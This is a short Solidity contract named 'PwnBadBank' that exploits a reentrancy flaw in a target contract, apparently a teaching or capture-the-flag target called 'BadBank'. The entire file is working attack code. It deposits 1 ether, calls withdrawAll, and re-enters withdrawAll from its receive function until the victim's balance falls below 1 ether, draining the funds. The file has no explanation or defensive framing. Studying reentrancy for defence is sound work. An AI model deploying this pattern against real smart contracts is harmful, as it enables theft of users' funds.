interface IBadBank {
  function withdrawAll() external;
}
contract PwnBadBank {
  function pwn(address badBank) external {
      (bool success, ) = payable(badBank).call{value: 1 ether}("");
      require(success);
      IBadBank(badBank).withdrawAll();
  }
  receive() external payable {
      if(msg.sender.balance >= 1 ether) {
          IBadBank(msg.sender).withdrawAll();
      }
  }
}
